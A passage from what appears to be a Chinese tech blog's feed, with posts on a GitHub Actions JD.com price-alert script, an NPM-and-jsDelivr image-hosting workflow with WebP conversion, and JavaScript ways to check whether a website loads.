class=\"keyword\">def</span> <span class=\"title\">wechat_send</span>(<span class=\"params\">key, title, text</span>):</span></span><br><span class=\"line\">    url = <span class=\"string\">'http://sc.ftqq.com/{0}.send?text={1}&amp;desp={2}'</span>.<span class=\"built_in\">format</span>(key, urllib.parse.quote(title), urllib.parse.quote(text))</span><br><span class=\"line\">    headers = {</span><br><span class=\"line\">        <span class=\"string\">'User-Agent'</span>: <span class=\"string\">\"Check Price Bot\"</span></span><br><span class=\"line\">    }</span><br><span class=\"line\">    request = urllib.request.Request(url=url, headers=headers)</span><br><span class=\"line\">    response = urllib.request.urlopen(request)</span><br><span class=\"line\">    page_text = json.loads(response.read().decode(<span class=\"string\">'utf-8'</span>))</span><br><span class=\"line\">    <span class=\"keyword\">if</span> page_text[<span class=\"string\">'errno'</span>] == <span class=\"number\">0</span>:</span><br><span class=\"line\">        <span class=\"keyword\">return</span> <span class=\"literal\">True</span></span><br><span class=\"line\">    <span class=\"keyword\">else</span>:</span><br><span class=\"line\">        <span class=\"keyword\">return</span> <span class=\"literal\">False</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">qmsg_send</span>(<span class=\"params\">key, <span class=\"built_in\">id</span>, text</span>):</span></span><br><span class=\"line\">    url = <span class=\"string\">'http://qmsg.zendee.cn/send/{0}?msg={1}&amp;qq={2}'</span>.<span class=\"built_in\">format</span>(key, urllib.parse.quote(text), <span class=\"built_in\">id</span>)</span><br><span class=\"line\">    headers = {</span><br><span class=\"line\">        <span class=\"string\">'User-Agent'</span>: <span class=\"string\">\"Check Price Bot\"</span></span><br><span class=\"line\">    }</span><br><span class=\"line\">    request = urllib.request.Request(url=url, headers=headers)</span><br><span class=\"line\">    response = urllib.request.urlopen(request)</span><br><span class=\"line\">    page_text = json.loads(response.read().decode(<span class=\"string\">'utf-8'</span>))</span><br><span class=\"line\">    <span class=\"keyword\">if</span> page_text[<span class=\"string\">'code'</span>] == <span class=\"number\">0</span>:</span><br><span class=\"line\">        <span class=\"keyword\">return</span> <span class=\"literal\">True</span></span><br><span class=\"line\">    <span class=\"keyword\">else</span>:</span><br><span class=\"line\">        <span class=\"keyword\">return</span> <span class=\"literal\">False</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">notify</span>(<span class=\"params\"><span class=\"built_in\">id</span>,<span class=\"built_in\">type</span>,price,nowPrice</span>):</span></span><br><span class=\"line\">    <span class=\"string\">'''</span></span><br><span class=\"line\"><span class=\"string\">    type:</span></span><br><span class=\"line\"><span class=\"string\">        0: 涨价</span></span><br><span class=\"line\"><span class=\"string\">        1: 无变化</span></span><br><span class=\"line\"><span class=\"string\">        2: 降价</span></span><br><span class=\"line\"><span class=\"string\">    id: 商品 ID</span></span><br><span class=\"line\"><span class=\"string\">    price: 差价</span></span><br><span class=\"line\"><span class=\"string\">    nowPrice: 现价</span></span><br><span class=\"line\"><span class=\"string\">    '''</span></span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">for</span> svId <span class=\"keyword\">in</span> server:</span><br><span class=\"line\">        <span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">send</span>(<span class=\"params\">title,content</span>):</span></span><br><span class=\"line\">            <span class=\"keyword\">if</span> svId == <span class=\"string\">'wechat'</span>:</span><br><span class=\"line\">                wechat_send(wechat[<span class=\"string\">\"key\"</span>],title,content)</span><br><span class=\"line\">            <span class=\"keyword\">if</span> svId == <span class=\"string\">'qmsg'</span>:</span><br><span class=\"line\">                qmsg_send(qmsg[<span class=\"string\">\"key\"</span>],qmsg[<span class=\"string\">\"qid\"</span>],title + <span class=\"string\">\"\\n\"</span> + content)</span><br><span class=\"line\">            <span class=\"keyword\">else</span>:</span><br><span class=\"line\">                <span class=\"keyword\">return</span> <span class=\"literal\">False</span></span><br><span class=\"line\">        <span class=\"keyword\">if</span> <span class=\"built_in\">type</span> == <span class=\"number\">0</span>:</span><br><span class=\"line\">            title = <span class=\"string\">\"商品 {0} 涨价!\"</span>.<span class=\"built_in\">format</span>(<span class=\"built_in\">id</span>)</span><br><span class=\"line\">            content = <span class=\"string\">\"您关注的商品 {0} 涨价咯！价格相较于上次监测，高了 {1} 元，现价 {2} 元。商品详情：https://item.jd.com/{0}.html\"</span>.<span class=\"built_in\">format</span>(<span class=\"built_in\">id</span>,price,nowPrice)</span><br><span class=\"line\">            send(title,content)</span><br><span class=\"line\">        <span class=\"keyword\">elif</span> <span class=\"built_in\">type</span> == <span class=\"number\">1</span>:</span><br><span class=\"line\">            print(<span class=\"string\">\"价格没有变化，不推送通知。\"</span>)</span><br><span class=\"line\">        <span class=\"keyword\">elif</span> <span class=\"built_in\">type</span> == <span class=\"number\">2</span>:</span><br><span class=\"line\">            title = <span class=\"string\">\"商品 {0} 降价!\"</span>.<span class=\"built_in\">format</span>(<span class=\"built_in\">id</span>)</span><br><span class=\"line\">            content = <span class=\"string\">\"您关注的商品 {0} 降价咯！价格相较于上次监测，低了 {1} 元，现价 {2} 元。商品详情：https://item.jd.com/{0}.html\"</span>.<span class=\"built_in\">format</span>(<span class=\"built_in\">id</span>, price,nowPrice)</span><br><span class=\"line\">            send(title, content)</span><br><span class=\"line\">        <span class=\"keyword\">else</span>:</span><br><span class=\"line\">            <span class=\"keyword\">return</span> <span class=\"literal\">False</span></span><br></pre></td></tr></table></figure>\n</div></details><details class=\"post-details\"><summary><code>.github/workflows/auto.yml</code> (点击展开)</summary><div class=\"details-content\">  <figure class=\"highlight yaml\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"attr\">name:</span> <span class=\"string\">Check</span> <span class=\"string\">Price</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"attr\">on:</span></span><br><span class=\"line\">  <span class=\"attr\">push:</span></span><br><span class=\"line\">    <span class=\"attr\">branches:</span> </span><br><span class=\"line\">      <span class=\"bullet\">-</span> <span class=\"string\">master</span></span><br><span class=\"line\">  <span class=\"attr\">schedule:</span></span><br><span class=\"line\">    <span class=\"comment\"># 每 1 小时运行一次</span></span><br><span class=\"line\">    <span class=\"bullet\">-</span> <span class=\"attr\">cron:</span> <span class=\"string\">\"0 * * * *\"</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"attr\">jobs:</span></span><br><span class=\"line\">  <span class=\"attr\">check:</span></span><br><span class=\"line\">    <span class=\"attr\">runs-on:</span> <span class=\"string\">ubuntu-latest</span></span><br><span class=\"line\">    <span class=\"attr\">steps:</span></span><br><span class=\"line\">      <span class=\"bullet\">-</span> <span class=\"attr\">name:</span> <span class=\"string\">Clone</span> <span class=\"string\">repository</span></span><br><span class=\"line\">        <span class=\"attr\">uses:</span> <span class=\"string\">actions/checkout@v2</span></span><br><span class=\"line\">      <span class=\"bullet\">-</span> <span class=\"attr\">name:</span> <span class=\"string\">'Set up Python'</span></span><br><span class=\"line\">        <span class=\"attr\">uses:</span> <span class=\"string\">actions/setup-python@v2</span></span><br><span class=\"line\">        <span class=\"attr\">with:</span></span><br><span class=\"line\">          <span class=\"attr\">python-version:</span> <span class=\"number\">3.7</span></span><br><span class=\"line\">      <span class=\"bullet\">-</span> <span class=\"attr\">name:</span> <span class=\"string\">Run</span></span><br><span class=\"line\">        <span class=\"attr\">run:</span> <span class=\"string\">|</span></span><br><span class=\"line\">          <span class=\"string\">python</span> <span class=\"string\">main.py</span></span><br><span class=\"line\">      <span class=\"bullet\">-</span> <span class=\"attr\">name:</span> <span class=\"string\">Push</span></span><br><span class=\"line\">        <span class=\"attr\">run:</span> <span class=\"string\">|</span></span><br><span class=\"line\">          <span class=\"string\">git</span> <span class=\"string\">config</span> <span class=\"string\">--local</span> <span class=\"string\">user.email</span> <span class=\"string\">\"icolabot@e.yfun.top\"</span></span><br><span class=\"line\">          <span class=\"string\">git</span> <span class=\"string\">config</span> <span class=\"string\">--local</span> <span class=\"string\">user.name</span> <span class=\"string\">\"iColaBot\"</span></span><br><span class=\"line\">          <span class=\"string\">date</span> <span class=\"string\">+\"%Y-%m-%d</span> <span class=\"string\">%H:%M:%S.%N\"</span> <span class=\"string\">&gt;</span> <span class=\"string\">date.txt</span></span><br><span class=\"line\">          <span class=\"string\">git</span> <span class=\"string\">add</span> <span class=\"string\">-A</span></span><br><span class=\"line\">          <span class=\"string\">git</span> <span class=\"string\">commit</span> <span class=\"string\">-am</span> <span class=\"string\">\"Update price.json\"</span></span><br><span class=\"line\">          <span class=\"string\">git</span> <span class=\"string\">push</span> <span class=\"string\">origin</span> <span class=\"string\">master</span></span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n</div></details><h2>\n<a href=\"https://blog.yfun.top/#%E6%B3%A8%E6%84%8F\" class=\"headerlink\" title=\"注意\"></a>注意</h2>\n<p>计划任务语法有 5 个字段，中间用空格分隔，每个字段代表一个时间单位。</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">┌───────────── 分钟 (0 - 59)</span><br><span class=\"line\">│ ┌───────────── 小时 (0 - 23)</span><br><span class=\"line\">│ │ ┌───────────── 日 (1 - 31)</span><br><span class=\"line\">│ │ │ ┌───────────── 月 (1 - 12 或 JAN-DEC)</span><br><span class=\"line\">│ │ │ │ ┌───────────── 星期 (0 - 6 或 SUN-SAT)</span><br><span class=\"line\">│ │ │ │ │</span><br><span class=\"line\">│ │ │ │ │</span><br><span class=\"line\">│ │ │ │ │</span><br><span class=\"line\">* * * * *</span><br></pre></td></tr></table></figure><p>每个时间字段的含义：</p>\n<table>\n<thead><tr>\n<th align=\"center\">符号</th>\n<th align=\"center\">描述</th>\n<th align=\"center\">举例</th>\n</tr></thead>\n<tbody>\n<tr>\n<td align=\"center\"><code>*</code></td>\n<td align=\"center\">任意值</td>\n<td align=\"center\">\n<code>* * * * *</code> 每天每小时每分钟</td>\n</tr>\n<tr>\n<td align=\"center\"><code>,</code></td>\n<td align=\"center\">值分隔符</td>\n<td align=\"center\">\n<code>1,3,4,7 * * * *</code> 每小时的 1 3 4 7 分钟</td>\n</tr>\n<tr>\n<td align=\"center\"><code>-</code></td>\n<td align=\"center\">范围</td>\n<td align=\"center\">\n<code>1-6 * * * *</code> 每小时的 1-6 分钟</td>\n</tr>\n<tr>\n<td align=\"center\"><code>/</code></td>\n<td align=\"center\">每</td>\n<td align=\"center\">\n<code>*/15 * * * *</code> 每隔 15 分钟</td>\n</tr>\n</tbody>\n</table>\n<blockquote><p>注：由于 GitHub Actions 的限制，如果设置为 <code>* * * * *</code> 实际的执行频率为每 5 分执行一次。</p></blockquote>\n<h2>\n<a href=\"https://blog.yfun.top/#%E5%90%8E\" class=\"headerlink\" title=\"后\"></a>后</h2>\n<p>新建文件 并 配置 <code>notify.py</code> 后，GitHub Action 就会定时执行代码。如果有降价或涨价，就会按照 <code>notify.py</code> 的配置进行通知。</p>\n<p>京东也有降价提醒的功能，但我实在是不想给 京东 开通知权限，经常推送商品广告。</p>\n<p>本文部分内容参考：<a href=\"https://github.com/justjavac/auto-green#readme\">justjavac/auto-green#readme</a></p>\n","link":"https://blog.yfun.top/posts/1238639652/"},{"title":"我的图床解决方案","date":"2021-05-08 10:30:00","description":"\n<p>博客的文章经常需要插入图片，如果我将文档与图片放在一起，那么图片的加载速度将会很慢，于是我使用了图床。</p>\n<p>图床的选择有很多，<a href=\"https://blog.yfun.top/posts/3867215122/\">笔者之前写过一篇关于免费图床的汇总</a>，本文就来介绍下我采用的方案：NPM。</p>\n<blockquote><p>本文假设您已有 NPM 账号、GitHub 账号。</p></blockquote>\n<h2>\n<a href=\"https://blog.yfun.top/#%E5%87%86%E5%A4%87%E5%B7%A5%E4%BD%9C\" class=\"headerlink\" title=\"准备工作\"></a>准备工作</h2>\n<h3>\n<a href=\"https://blog.yfun.top/#%E6%96%B0%E5%BB%BA%E4%BB%93%E5%BA%93\" class=\"headerlink\" title=\"新建仓库\"></a>新建仓库</h3>\n<p>新建一个 GitHub 仓库，公开或是私人都可以，此处不再赘述。</p>\n<p>在 Git 仓库中新建 <code>rawimg/.gitkeep</code> 与 <code>webpimg/.gitkeep</code> 两个文件。</p>\n<h3>\n<a href=\"https://blog.yfun.top/#%E8%8E%B7%E5%8F%96%E4%BB%A4%E7%89%8C\" class=\"headerlink\" title=\"获取令牌\"></a>获取令牌</h3>\n<p>登录 <a href=\"https://npmjs.com/\">https://npmjs.com</a> ，点击右上角的头像，进入 <code>Access Token</code>。</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/ocoke-osg@0.0.8/rawimg/1Xbrlw.png\"></p>\n<p>点击页面中的 <code>Generate New Token</code> 获取新的令牌。</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/ocoke-osg@0.0.8/rawimg/OQMmsB.png\"></p>\n<p>选择 <code>Automation</code>，点击 <code>Generate Token</code> 生成令牌。</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/ocoke-osg@0.0.8/rawimg/4Ob3xs.png\"></p>\n<p>将生成的令牌复制下来。</p>\n<p>进入 GitHub 仓库，点击 <code>Settings</code>。</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/ocoke-osg@0.0.8/rawimg/UfBqld.png\"></p>\n<p>点击菜单栏中的 <code>Secrets</code>。</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/ocoke-osg@0.0.8/rawimg/SStNlF.png\"></p>\n<p>点击 <code>New repository secret</code> 新建一个 Secret。</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/ocoke-osg@0.0.8/rawimg/UYSnao.png\"></p>\n<p>Secret Name 为 <code>NPM_TOKEN</code>，Value 是你的 NPM 令牌，点击 <code>Add secret</code> 添加。</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/ocoke-osg@0.0.8/rawimg/OY4C6A.png\"></p>\n<p>在仓库中新建 <code>package.json</code> 文件，参考如下：</p>\n<figure class=\"highlight json\"><table><tr><td class=\"code\"><pre><span class=\"line\">{</span><br><span class=\"line\">  <span class=\"attr\">\"name\"</span>: <span class=\"string\">\"ocoke-osg\"</span>,</span><br><span class=\"line\">  <span class=\"attr\">\"version\"</span>: <span class=\"string\">\"0.0.0\"</span>,</span><br><span class=\"line\">  <span class=\"attr\">\"description\"</span>: <span class=\"string\">\"Somewhere to save the file from @oCoke\"</span>,</span><br><span class=\"line\">  <span class=\"attr\">\"author\"</span>: <span class=\"string\">\"YFun(@oCoke)\"</span></span><br><span class=\"line\">}</span><br></pre></td></tr></table></figure><h2>\n<a href=\"https://blog.yfun.top/#%E5%9B%BE%E7%89%87%E8%BD%AC%E6%8D%A2%E4%B8%8E%E5%8F%91%E5%B8%83\" class=\"headerlink\" title=\"图片转换与发布\"></a>图片转换与发布</h2>\n<p>为了方便多端写作，我使用 GitHub 临时存储所需的图片，GitHub Action 发布 NPM 包。</p>\n<p>WebP 可以大大缩减图片的尺寸，我们还可以借助 GitHub Action 在发布前自动转换。</p>  <details class=\"post-details\"><summary>GitHub Action 代码 (点击展开)</summary><div class=\"details-content\">  <figure class=\"highlight yaml\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"attr\">name:</span> <span class=\"string\">NPM</span> <span class=\"string\">&amp;</span> <span class=\"string\">WebP</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 在 Release 发布时 或手动执行</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"attr\">on:</span></span><br><span class=\"line\">  <span class=\"attr\">release:</span></span><br><span class=\"line\">     <span class=\"attr\">types:</span></span><br><span class=\"line\">       <span class=\"bullet\">-</span> <span class=\"string\">published</span></span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"attr\">workflow_dispatch:</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"attr\">jobs:</span></span><br><span class=\"line\">  <span class=\"attr\">publish-npm:</span></span><br><span class=\"line\">    <span class=\"attr\">runs-on:</span> <span class=\"string\">ubuntu-latest</span></span><br><span class=\"line\">    <span class=\"comment\"># Clone 仓库</span></span><br><span class=\"line\">    <span class=\"attr\">steps:</span></span><br><span class=\"line\">      <span class=\"bullet\">-</span> <span class=\"attr\">name:</span> <span class=\"string\">Checkout</span></span><br><span class=\"line\">        <span class=\"attr\">uses:</span> <span class=\"string\">actions/checkout@v2</span></span><br><span class=\"line\">        <span class=\"attr\">with:</span></span><br><span class=\"line\">          <span class=\"attr\">ref:</span> <span class=\"string\">master</span></span><br><span class=\"line\">      <span class=\"comment\"># 安装 Node.js    </span></span><br><span class=\"line\">      <span class=\"bullet\">-</span> <span class=\"attr\">name:</span> <span class=\"string\">Setup</span> <span class=\"string\">Node</span></span><br><span class=\"line\">        <span class=\"attr\">uses:</span> <span class=\"string\">actions/setup-node@v1</span></span><br><span class=\"line\">        <span class=\"attr\">with:</span></span><br><span class=\"line\">          <span class=\"attr\">node-version:</span> <span class=\"string\">\"12.x\"</span></span><br><span class=\"line\">          <span class=\"attr\">registry-url:</span> <span class=\"string\">https://registry.npmjs.org/</span></span><br><span class=\"line\">        </span><br><span class=\"line\">      <span class=\"comment\"># rawimg/ 作为原始图片存储，webpimg/ 作为压缩图片存储处，最后合并。</span></span><br><span class=\"line\">      <span class=\"comment\"># 安装相关插件，转换图片。</span></span><br><span class=\"line\">      <span class=\"bullet\">-</span> <span class=\"attr\">name:</span> <span class=\"string\">Install</span> <span class=\"string\">&amp;</span> <span class=\"string\">Convert</span></span><br><span class=\"line\">        <span class=\"attr\">run:</span> <span class=\"string\">|</span></span><br><span class=\"line\">          <span class=\"string\">npm</span> <span class=\"string\">install</span> <span class=\"string\">-g</span> <span class=\"string\">webp-batch-convert</span></span><br><span class=\"line\">          <span class=\"string\">cwebp-batch</span> <span class=\"string\">--in</span> <span class=\"string\">rawimg</span> <span class=\"string\">--out</span> <span class=\"string\">webpimg</span> <span class=\"string\">-q</span> <span class=\"number\">75</span> <span class=\"string\">-quiet</span></span><br><span class=\"line\">          <span class=\"string\">mv</span> <span class=\"string\">webpimg/*.webp</span> <span class=\"string\">rawimg/</span></span><br><span class=\"line\">          </span><br><span class=\"line\">      <span class=\"comment\"># 发布 NPM 包</span></span><br><span class=\"line\">      <span class=\"bullet\">-</span> <span class=\"attr\">name:</span> <span class=\"string\">Publish</span> <span class=\"string\">Package</span></span><br><span class=\"line\">        <span class=\"attr\">run:</span> <span class=\"string\">|</span></span><br><span class=\"line\">          <span class=\"string\">git</span> <span class=\"string\">config</span> <span class=\"string\">--global</span> <span class=\"string\">user.email</span> <span class=\"string\">\"icolabot@e.yfun.top\"</span></span><br><span class=\"line\">          <span class=\"string\">git</span> <span class=\"string\">config</span> <span class=\"string\">--global</span> <span class=\"string\">user.name</span> <span class=\"string\">\"iColaBot\"</span></span><br><span class=\"line\">          <span class=\"string\">npm</span> <span class=\"string\">version</span> <span class=\"string\">patch</span></span><br><span class=\"line\">          <span class=\"string\">npm</span> <span class=\"string\">publish</span></span><br><span class=\"line\">        <span class=\"attr\">env:</span></span><br><span class=\"line\">          <span class=\"attr\">NODE_AUTH_TOKEN:</span> <span class=\"string\">${{secrets.npm_token}}</span></span><br><span class=\"line\">          </span><br><span class=\"line\">      <span class=\"comment\"># 删除 rawimg/ 和 webpimg/ 下的所有文件</span></span><br><span class=\"line\">      <span class=\"bullet\">-</span> <span class=\"attr\">name:</span> <span class=\"string\">Delete</span> <span class=\"string\">Files</span></span><br><span class=\"line\">        <span class=\"attr\">run:</span> <span class=\"string\">|</span></span><br><span class=\"line\">          <span class=\"string\">rm</span> <span class=\"string\">-rf</span> <span class=\"string\">webpimg/*</span></span><br><span class=\"line\">          <span class=\"string\">rm</span> <span class=\"string\">-rf</span> <span class=\"string\">rawimg/*</span></span><br><span class=\"line\">          <span class=\"string\">touch</span> <span class=\"string\">webpimg/.gitkeep</span></span><br><span class=\"line\">          <span class=\"string\">touch</span> <span class=\"string\">rawimg/.gitkeep</span></span><br><span class=\"line\">          </span><br><span class=\"line\">      <span class=\"bullet\">-</span> <span class=\"attr\">name:</span> <span class=\"string\">Push</span></span><br><span class=\"line\">        <span class=\"attr\">run:</span> <span class=\"string\">|</span></span><br><span class=\"line\">          <span class=\"string\">git</span> <span class=\"string\">add</span> <span class=\"string\">-A</span></span><br><span class=\"line\">          <span class=\"string\">git</span> <span class=\"string\">commit</span> <span class=\"string\">-m</span> <span class=\"string\">\"Publish\"</span></span><br><span class=\"line\">          <span class=\"string\">git</span> <span class=\"string\">push</span> <span class=\"string\">origin</span> <span class=\"string\">master</span></span><br></pre></td></tr></table></figure>\n</div></details><h2>\n<a href=\"https://blog.yfun.top/#%E4%BD%BF%E7%94%A8\" class=\"headerlink\" title=\"使用\"></a>使用</h2>\n<h3>\n<a href=\"https://blog.yfun.top/#%E4%B8%8A%E4%BC%A0\" class=\"headerlink\" title=\"上传\"></a>上传</h3>\n<p>将图片文件上传至仓库的 <code>rawimg/</code> 文件夹下即可。</p>\n<p>当然也可以使用 PicGo / UPic / HexoPlusPlus 等工具上传。</p>\n<h3>\n<a href=\"https://blog.yfun.top/#%E5%8F%91%E5%B8%83\" class=\"headerlink\" title=\"发布\"></a>发布</h3>\n<p>在 GitHub 中新建 Release，将自动修改版本号并发布 NPM 包，无需手动修改 <code>package.json</code>。</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/ocoke-osg@0.0.8/rawimg/t2afFy.png\"></p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/ocoke-osg@0.0.8/rawimg/0wAmRV.png\"></p>\n<h3>\n<a href=\"https://blog.yfun.top/#%E8%AE%BF%E9%97%AE\" class=\"headerlink\" title=\"访问\"></a>访问</h3>\n<h4>\n<a href=\"https://blog.yfun.top/#%E6%8E%A8%E8%8D%90%E7%9A%84%E9%95%9C%E5%83%8F\" class=\"headerlink\" title=\"推荐的镜像\"></a>推荐的镜像</h4>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">https://cdn.jsdelivr.net/npm/  <span class=\"comment\"># jsDelivr</span></span><br><span class=\"line\">https://unpkg.zhimg.com/ <span class=\"comment\"># 知乎</span></span><br><span class=\"line\">https://code.bdstatic.com/npm/ <span class=\"comment\"># 百度 (不推荐)</span></span><br><span class=\"line\">https://shadow.elemecdn.com/npm/ <span class=\"comment\"># 饿了么</span></span><br><span class=\"line\">https://unpkg.com/ <span class=\"comment\"># Unpkg</span></span><br></pre></td></tr></table></figure><p>镜像推荐选择访问速度快的，比较稳定的，拉取速度快的。</p>\n<p>我选择的是 jsDelivr，国内外速度都很优秀。</p>\n<h4>\n<a href=\"https://blog.yfun.top/#%E9%93%BE%E6%8E%A5\" class=\"headerlink\" title=\"链接\"></a>链接</h4>\n<p>以 jsDelivr 为例，原图链接为：</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">https://cdn.jsdelivr.net/npm/[package-name]@[version]/rawimg/[filename].[suffix]</span><br></pre></td></tr></table></figure><p>WebP 图片链接为：</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">https://cdn.jsdelivr.net/npm/[package-name]@[version]/rawimg/[filename].webp</span><br></pre></td></tr></table></figure><table>\n<thead><tr>\n<th>[值]</th>\n<th>说明</th>\n</tr></thead>\n<tbody>\n<tr>\n<td><code>package-name</code></td>\n<td>NPM 包的名称 (<code>package.json</code> 文件中 <code>name</code> 的值)</td>\n</tr>\n<tr>\n<td><code>version</code></td>\n<td>当前版本 (<code>package.json</code> 文件中 <code>version</code> 的值，通常需要在发布 Release 1 分钟后更新)</td>\n</tr>\n<tr>\n<td><code>filename</code></td>\n<td>文件名</td>\n</tr>\n<tr>\n<td><code>suffix</code></td>\n<td>文件后缀名</td>\n</tr>\n</tbody>\n</table>\n","link":"https://blog.yfun.top/posts/2876015612/"},{"title":"使用 JS 检测网址能否正常加载","date":"2021-04-09 12:42:00","description":"\n<p>有时我们需要判断用户能否加载某些网页或服务，如 Google、Disqus 等。</p>\n<p>而我们可以用 JavaScript 来实现这样的检测功能。</p>\n<h2>\n<a href=\"https://blog.yfun.top/#%E6%96%B9%E6%B3%95%E4%B8%80\" class=\"headerlink\" title=\"方法一\"></a>方法一</h2>\n<p>使用 JavaScript 创建一个图片，设置图片的链接为 检测网址 + <code>favicon.ico</code>。</p>\n<p><code>onerror</code> 事件触发不能加载的事件，<code>onload</code> 事件触发可以加载的事件，并使用 <code>setTimeout</code> 设置超时时间。</p>\n<p>代码：</p>\n<figure class=\"highlight javascript\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">// 新建一个图片</span></span><br><span class=\"line\"><span class=\"keyword\">var</span> img = <span class=\"keyword\">new</span> Image();</span><br><span class=\"line\"><span class=\"comment\">// 设置图片的链接</span></span><br><span class=\"line\">img.src = <span class=\"string\">\"https://google.com/favicon.ico\"</span>;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">// 设定超时事件，延迟 3000 毫秒</span></span><br><span class=\"line\"><span class=\"keyword\">var</span> timeout = <span class=\"built_in\">setTimeout</span>(<span class=\"function\"><span class=\"keyword\">function</span> (<span class=\"params\"></span>) </span>{</span><br><span class=\"line\">    <span class=\"comment\">// 清除 onerror 和 onload 事件</span></span><br><span class=\"line\">img.onerror = img.onload = <span class=\"literal\">null</span>;</span><br><span class=\"line\"><span class=\"built_in\">console</span>.log(<span class=\"string\">\"time out.\"</span>);</span><br><span class=\"line\">    <span class=\"comment\">// 执行无法加载的事件</span></span><br><span class=\"line\">    canNotLoad();</span><br><span class=\"line\">},<span class=\"number\">3000</span>);</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">// 设定错误事件</span></span><br><span class=\"line\">img.onerror = <span class=\"function\"><span class=\"keyword\">function</span> (<span class=\"params\"></span>) </span>{</span><br><span class=\"line\">    <span class=\"comment\">// 先清除超时事件</span></span><br><span class=\"line\"><span class=\"built_in\">clearTimeout</span>(timeout);</span><br><span class=\"line\"><span class=\"built_in\">console</span>.log(<span class=\"string\">\"load error.\"</span>);</span><br><span class=\"line\">    <span class=\"comment\">// 执行无法加载的事件</span></span><br><span class=\"line\">    canNotLoad();</span><br><span class=\"line\">}</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">// 设定可以加载的事件</span></span><br><span class=\"line\">img.onload = <span class=\"function\"><span class=\"keyword\">function</span> (<span class=\"params\"></span>) </span>{</span><br><span class=\"line\">    <span class=\"comment\">// 先清除超时事件</span></span><br><span class=\"line\"><span class=\"built_in\">clearTimeout</span>(timeout);</span><br><span class=\"line\"><span class=\"built_in\">console</span>.log(<span class=\"string\">\"ok.\"</span>);</span><br><span class=\"line\">    <span class=\"comment\">// 执行可以加载的事件</span></span><br><span class=\"line\">    canLoad();</span><br><span class=\"line\">}</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">canNotLoad</span>(<span class=\"params\"></span>) </span>{</span><br><span class=\"line\">    <span class=\"comment\">/* code here */</span></span><br><span class=\"line\">    <span class=\"built_in\">console</span>.log(<span class=\"string\">\"无法加载\"</span>);</span><br><span class=\"line\">}</span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">canLoad</span>(<span class=\"params\"></span>) </span>{</span><br><span class=\"line\">    <span class=\"comment\">/* code here */</span></span><br><span class=\"line\">    <span class=\"built_in\">console</span>.log(<span class=\"string\">\"可以加载\"</span>);</span><br><span class=\"line\">}</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure><p>缺点：不是每一个网站都存在 <code>/favicon.ico</code> 文件，但如果加载特定文件的话挺好的。</p>\n<h2>\n<a href=\"https://blog.yfun.top/#%E6%96%B9%E6%B3%95%E4%BA%8C\" class=\"headerlink\" title=\"方法二\"></a>方法二</h2>\n<p>使用 JavaScript 创建一个 iframe 标签，设置标签的链接为 检测网址。</p>\n<p><code>onerror</code> 事件触发不能加载的事件，<code>onload</code> 事件触发可以加载的事件，并使用 <code>setTimeout</code> 设置超时时间。</p>\n<p>代码：</p>\n<figure class=\"highlight javascript\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">// 新建 iframe 标签</span></span><br><span class=\"line\"><span class=\"keyword\">var</span> iframe = <span class=\"built_in\">document</span>.createElement(<span class=\"string\">\"iframe\"</span>);</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">// 设置 iframe 标签的网址</span></span><br><span class=\"line\">iframe.src=<span class=\"string\">\"https://google.com\"</span>;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">// 设定超时事件，延迟 3000 毫秒</span></span><br><span class=\"line\"><span class=\"keyword\">var</span> timeout = <span class=\"built_in\">setTimeout</span>(<span class=\"function\"><span class=\"keyword\">function</span> (<span class=\"params\"></span>) </span>{</span><br><span class=\"line\">    <span class=\"comment\">// 清除 onerror 和 onload 事件</span></span><br><span class=\"line\">    iframe.onerror = iframe.onload = <span class=\"literal\">null</span>;</span><br><span class=\"line\">    <span class=\"built_in\">console</span>.log(<span class=\"string\">\"time out.\"</span>);</span><br><span class=\"line\">    <span class=\"comment\">// 执行无法加载的事件</span></span><br><span class=\"line\">    canNotLoad();</span><br><span class=\"line\">},<span class=\"number\">3000</span>);</span><br><span class=\"line\"><span class=\"comment\">// 设定错误事件</span></span><br><span class=\"line\">iframe.onerror = <span class=\"function\"><span class=\"keyword\">function</span> (<span class=\"params\"></span>) </span>{</span><br><span class=\"line\">    <span class=\"comment\">// 先清除超时事件</span></span><br><span class=\"line\">    <span class=\"built_in\">clearTimeout</span>(timeout);</span><br><span class=\"line\">    <span class=\"built_in\">console</span>.log(<span class=\"string\">\"load error.\"</span>);</span><br><span class=\"line\">    <span 